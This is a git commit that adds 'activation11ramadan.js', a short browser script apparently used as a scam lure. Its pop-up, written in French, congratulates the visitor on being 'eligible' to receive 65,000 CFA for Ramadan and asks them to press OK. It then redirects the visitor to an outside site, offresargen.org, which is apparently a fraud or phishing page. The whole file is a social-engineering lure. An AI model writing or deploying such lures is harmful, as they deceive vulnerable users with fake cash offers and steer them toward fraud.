6584d41b8595372f825bfd2af214c946b497d692
mitahelp <lawsonmitaa@gmail.com>
2026-02-23 08:14:41 +0100

    Create activation11ramadan.js

---
+++ activation11ramadan.js
@@ -0,0 +1,9 @@
+  
+var password = 'RETRAIT D ARGENT'
+password = prompt(
+  'Félicitations! Vous êtes éligible à recevoir 65 000 CFA. Veuillez appuyer sur OK pour l obtenir maintenant.',
+  'RETRAIT D ARGENT'
+);
+if (password != 'RETRAIT D ARGENT') {
+  location.href = 'https://offresargen.org/65000-CFA-Assimi-Ramadan.html';
+}
